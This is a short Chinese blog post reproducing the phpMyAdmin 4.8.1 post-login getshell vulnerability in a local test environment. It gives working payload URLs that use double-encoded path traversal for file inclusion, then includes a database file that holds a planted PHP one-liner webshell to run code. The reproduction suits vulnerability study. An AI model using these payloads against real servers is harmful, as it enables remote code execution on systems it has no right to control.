---
title: phpMyAdmin 4.8.1后台getshell漏洞复现
date: 2018-06-25 13:43:40
tags: "phpmyadmin"
---

## 漏洞分析
弱鸡一枚，还分析个毛线，直接照着大佬的操作复现吧。

## 漏洞复现
下载目标版本的包，解压安装之。
环境：
- [x] phpstudy 2016
- [x] php 5.5.38
- [x] Apache

使用默认口令root/root登录系统。

![image](http://wx3.sinaimg.cn/mw690/a1a4875fgy1fsniyv9aj2j20wd0l5gxl.jpg)

漏洞第一步是文件包含的利用。

**payload:**
```
http://localhost:8888/phpMyAdmin-4.8.1/index.php?target=db_sql.php%253f/../../../../../../../../../phpStudy//test.ini
```
直接使用浏览器访问payload。

![image](http://wx4.sinaimg.cn/mw690/a1a4875fgy1fsniyw5o4hj20so0o214e.jpg)

**我是使用win10的机器，只能读取phpmyadmin所在盘符下的文件，不知道怎么跨盘符，有知道得表哥还望指点一二。。。**

在此基础上，可以实现不写文件也能getshell。

首先，我们登录了phpmyadin，是可以完全控制数据库的，于是可以把webshell写入到数据库中，然后包含之。

尝试写一句话到测试数据库文件中。

![image](http://wx4.sinaimg.cn/mw690/a1a4875fgy1fsniyws3o3j20qk0khdmd.jpg)

发现一句话确实已经在数据库文件中了，那就开始“含”住它吧！

**payload:**
```
http://localhost:8888/phpMyAdmin-4.8.1/index.php?a=phpinfo();&target=db_sql.php%253f/../../../../../.././../../../../../phpStudy/MySQL/data/test/test1.frm
```
Bingo！

![image](http://wx1.sinaimg.cn/mw690/a1a4875fgy1fsniyxlzjpj20qg0htk6q.jpg)

哎，工头又喊我去搬砖了，小弟告辞。

![image](http://www.gaoxiaogif.com/d/file/201801/9cd66c37bbe862c5e5f77681cc97204c.jpg)
